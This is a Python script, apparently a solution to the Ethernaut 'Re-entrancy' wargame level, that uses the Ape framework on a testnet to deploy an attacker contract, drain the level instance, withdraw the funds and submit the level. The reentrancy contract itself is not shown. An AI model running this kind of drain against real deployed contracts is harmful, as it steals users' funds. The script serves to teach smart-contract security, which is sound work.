from ape import accounts, project
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xAe7b9fb081eD0b8CA687C9117C294E6d17e88F8f"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(
        ETHERNAUT, LEVEL, user, value="0.001 ether"
    )

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.Reentrancy.deploy(instance, sender=user, value="0.001 ether")

    # exploit goes here
    print(f"\n--- Instance balance before exploit: {hacker.instanceBalance()} ---\n")
    print(f"\n--- Our balance before exploit: {hacker.balance} ---\n")

    print("\n--- Exploiting level instance ---\n")
    hacker.attack(sender=user)

    print(f"\n--- Instance balance after exploit: {hacker.instanceBalance()} ---\n")
    print(f"\n--- Our balance after exploit: {hacker.balance} ---\n")

    # recover funds
    print("\n--- Recovering funds ---\n")
    hacker.withdraw(sender=user)

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
